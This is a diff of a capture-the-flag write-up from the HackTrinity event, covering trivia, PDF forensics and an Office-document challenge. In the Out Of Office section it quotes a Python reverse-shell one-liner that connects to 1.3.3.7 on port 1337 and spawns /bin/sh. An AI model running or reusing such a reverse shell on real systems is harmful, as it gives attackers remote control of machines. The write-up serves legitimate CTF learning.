@@ -28,7 +28,7 @@ This challenge was another of the so-called simple challenges and simply acted a
 
 ### Trivia - Unknown
 
-This was the first of the trivia challenges. Once again it was another easy one as you were given a quote and upon googling that quote you would quickly come to the conclusion that it was said by Zero Cool from the movie Hackers. This flag was non standard format.
+This was the first of the trivia challenges. Once again it was another easy one as you were given a quote and upon googling that quote you would quickly come to the conclusion that it was said by Crash Override from the movie Hackers. This flag was non standard format.
 
 {: .box-note}
 **Flag:** Crash Override
@@ -97,7 +97,7 @@ I was baffled. I was sure I had the right answer but alas this was not the case.
 
 ### Forensics - Panic
 
-This challenge gave you minimal information and a simple file called "bread.pdf". Upon opening it there is only one page with a picture of the empty bread isles in supermarkets due to coronavirus which I thought was a good homage to the current virus situation. I never really had any experience with the pdf format as a whole and so I began by searching for pdf virus analysis blogs online where I thought maybe some security researchers would make their own write ups on malicious pdf documents. My time spent searching led me to a tool called [peepdf](https://github.com/jesparza/peepdf) which is great for browsing the structure of a pdf document. After opening up "bread.pdf" in peepdf it gave me some information about the file such as the number of objects. It even helpfully labelled a suspicious element in object 8, however sadly there were no suspicious javascript elements as I had hoped there would be.
+This challenge gave you minimal information and a simple file called "bread.pdf". Upon opening it there is only one page with a picture of the empty bread isles in supermarkets due to coronavirus which I thought was a good homage to the current virus that shall not be named situation. I never really had any experience with the pdf format as a whole and so I began by searching for pdf virus analysis blogs online where I thought maybe some security researchers would make their own write ups on malicious pdf documents. My time spent searching led me to a tool called [peepdf](https://github.com/jesparza/peepdf) which is great for browsing the structure of a pdf document. After opening up "bread.pdf" in peepdf it gave me some information about the file such as the number of objects. It even helpfully labelled a suspicious element in object 8, however sadly there were no suspicious javascript elements as I had hoped there would be.
 
 ![HackTrinity_Panic1.JPG]({{site.baseurl}}/img/HackTrinity_Panic1.JPG)
 
@@ -125,14 +125,14 @@ After some searching around I opened one of the xml files called "item1.xml" and
 
 ![HackTrinity_Out_Of_Office1.JPG]({{site.baseurl}}/img/HackTrinity_Out_Of_Office2.JPG)
 
-_However_ after quickly copying it over to my browser it returned a page not found error? I was left stumped for a short while before thinking of a website I had used many a time in the past called the .[Wayback Machine](https://archive.org/web/) which stores archived versions of webpages. Sure enough there was one snapshot saved of this pastebin url and bingo some code was hidden within:
+_However_ after quickly copying it over to my browser it returned a page not found error? I was left stumped for a short while before thinking of a website I had used many a time in the past called the [Wayback Machine](https://archive.org/web/) which stores archived versions of webpages. Sure enough there was one snapshot saved of this pastebin url and bingo some code was hidden within:
 
 ```python
 python - c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.3.3.7",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'#
 all the 1337 hackers have a signature right ? SGFja1RyaW5pdHl7QWxXQHk1X0MxM2FOX1VwX0BmdDNyX3kwdVJfSEBjazV9Cg ==
 ```
 
-From the looks of things it opens a reverse connection on port 1337 to your machine. I was wondering where to go from here and thought maybe I should listen for traffic on said port or something along those lines when I realised that there was no way this code ever ran as the pastebin url was invalid. That's when I remembered the base64 encoded string at the bottom. When decoded it in fact returns the flag.
+From the looks of things it opens a reverse shell connection on port 1337 to your machine. I was wondering where to go from here and thought maybe I should listen for traffic on said port or something along those lines when I realised that there was no way this code ever ran as the pastebin url was invalid. That's when I remembered the base64 encoded string at the bottom. When decoded it in fact returns the flag.
 
 {: .box-note}
 **Flag:** HackTrinity{AlW@y5_C13aN_Up_@ft3r_y0uR_H@ck5}
